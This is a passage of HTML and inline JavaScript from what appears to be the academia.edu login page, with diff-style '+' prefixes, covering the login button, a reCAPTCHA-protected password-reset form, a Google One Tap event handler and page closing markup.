class="col-sm-8"><div class="checkbox"><label class="u-m0x" style="line-height: 18px;"><input type="checkbox" name="remember_me" id="remember_me" value="1" checked="checked" /><div class="u-tcGrayDark u-fs12 u-fw400">Remember me on this computer</div></label></div></div><div class="col-sm-4"><input type="submit" name="commit" value="Log In" class="Button Button--lg Button--block js-login-submit u-p0x" data-disable-with="Log In" /></div></div></form><div class="collapse" id="login-reset-password-container"><br /><div class="well margin-0x"><form id="js-for-recaptcha--login-password-reset-form" action="https://www.academia.edu/reset_password" accept-charset="UTF-8" method="post"><input name="utf8" type="hidden" value="&#x2713;" autocomplete="off" /><input type="hidden" name="authenticity_token" value="E2TZBqOwEW2WziOHuo9mMzYerJBkKsF6obu3cWvGAWI78OyeUyvbesLDojq9ZzMMz4OlNqMRFPMM9enTeHK9bA==" autocomplete="off" /><p>Enter the email address you signed up with and we&#39;ll email you a reset link.</p><div class="form-group"><input class="form-control" name="email" type="email" /></div><script src="https://recaptcha.net/recaptcha/api.js" async defer></script>
+<input type="submit" data-sitekey="6Lf3KHUUAAAAACggoMpmGJdQDtiyrjVlvGJ6BbAj" data-callback="submitRecaptchaPasswordResetForm" class="g-recaptcha Button Button--block Button--blue" value="Email me a link" value=""/>
+</form></div></div><script>
+  require.config({ waitSeconds: 90 })(["https://a.academia-assets.com/assets/collapse-72afd7d03a2eed328fba4420f6e921c093fecdd2c413b664075f8e59de030c92.js"], function() { // from javascript_helper.rb
+    Aedu.recaptchaManagedForm(document.querySelector('.js-login-form'),
+  document.querySelector('.js-login-submit'));
+
+window.submitRecaptchaPasswordResetForm = function() {
+  $('#js-for-recaptcha--login-password-reset-form').submit();
+}
+
+var $resetPasswordContainer = $("#login-reset-password-container");
+
+$resetPasswordContainer.on("shown.bs.collapse", function(){
+
+  $resetPasswordContainer.find("input[type=email]").focus()
+
+  $('html, body').animate({
+    scrollTop: $resetPasswordContainer.offset().top
+  }, 500);
+});
+  });
+</script>
+</div></div><hr /><div class="row"><div class="u-taCenter u-mv8x u-tcGrayDark">Don&#39;t have an account?&nbsp;<a class="u-tcGrayDark u-textDecorationUnderline" href="https://www.academia.edu/signup">Sign Up</a></div></div></div></div></div></div></div><div data-auto_select="false" data-client_id="331998490334-rsn3chp12mbkiqhl6e7lu2q0mlbu0f1b" data-login_uri="https://www.academia.edu/registrations/google_one_tap" data-moment_callback="onGoogleOneTapEvent" id="g_id_onload"></div><script>function onGoogleOneTapEvent(event) {
+  var momentType = event.getMomentType();
+  var momentReason = null;
+
+  if (event.isNotDisplayed()) {
+    momentReason = event.getNotDisplayedReason();
+  } else if (event.isSkippedMoment()) {
+    momentReason = event.getSkippedReason();
+  } else if (event.isDismissedMoment()) {
+    momentReason = event.getDismissedReason();
+  }
+
+  Aedu.arbitraryEvents.write('GoogleOneTapEvent', {
+    moment_type: momentType,
+    moment_reason: momentReason,
+  });
+}</script><script src="https://accounts.google.com/gsi/client" async defer></script>  <script>document.addEventListener('DOMContentLoaded', function(){
+  var $dismissible = $(".dismissible_banner");
+  $dismissible.click(function(ev) {
+    $dismissible.hide();
+  });
+});</script>
+  
+    </div>
+
+    
+      <div class="DesignSystem"></div>
+
+    <div id='overlay_background'></div>
+    <div id='bootstrap-modal-container' class='bootstrap'></div>
+    <div id='ds-modal-container' class='bootstrap DesignSystem'></div>
+
+    <div id='full-screen-modal'></div>
+
+  </div>
+
+
+
+  
+  
+
+
+
+
+
+  </body>
+</html>
+
